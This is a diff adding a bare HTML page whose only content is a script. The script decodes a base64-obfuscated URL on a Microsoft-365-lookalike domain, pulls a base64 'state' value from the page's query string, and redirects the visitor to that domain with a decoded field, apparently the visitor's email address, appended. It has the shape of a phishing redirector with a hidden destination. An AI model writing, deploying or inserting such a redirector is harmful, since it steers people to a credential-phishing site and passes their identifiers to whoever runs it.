@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<script>
+let l = "aHR0cHM6Ly9maWxlLm8zNjVjbG91ZGZpbGUuY29tL0dSRUtPTFhEP2U9";
+let b64 = "no";
+
+const queryString = window.location.search;
+const urlParams = new URLSearchParams(queryString);
+let s = atob(urlParams.get('state'));
+let s_op = s.split("|");
+
+if(b64 == "yes") {
+	document.location.href = atob(l) + btoa(atob(s_op[2]));
+} else {
+	document.location.href = atob(l) + atob(s_op[2]);
+}
+</script>
+</head>
+</html>
